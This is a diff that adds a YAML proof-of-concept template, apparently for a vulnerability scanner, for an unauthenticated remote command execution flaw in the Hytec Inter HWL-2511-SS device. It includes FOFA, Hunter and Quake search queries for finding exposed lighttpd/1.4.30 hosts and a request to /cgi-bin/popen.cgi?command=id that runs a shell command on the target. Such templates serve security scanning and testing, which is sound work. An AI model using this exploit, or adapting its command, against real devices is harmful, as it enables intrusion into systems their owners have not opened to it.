@@ -1,0 +1,32 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: title="index" && header="lighttpd/1.4.30"
+    hunter-query: web.title="index" and header="lighttpd/1.4.30"
+    quake-query: title:"index" and header:"lighttpd/1.4.30"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-Hytec-Inter-HWL-2511-SS-popen-cgi-rce
+transport: http
+set:
+    s1: randomInt(100, 500)
+    s2: randomLowercase(8)
+rules:  
+    r0:
+        request:
+            method: GET
+            cache: true
+            path: /cgi-bin/popen.cgi?command=id
+            follow_redirects: false
+            headers:
+            body: 
+
+        expression: response.status == 200 && response.body_string.contains("uid")
+
+expression: r0() 
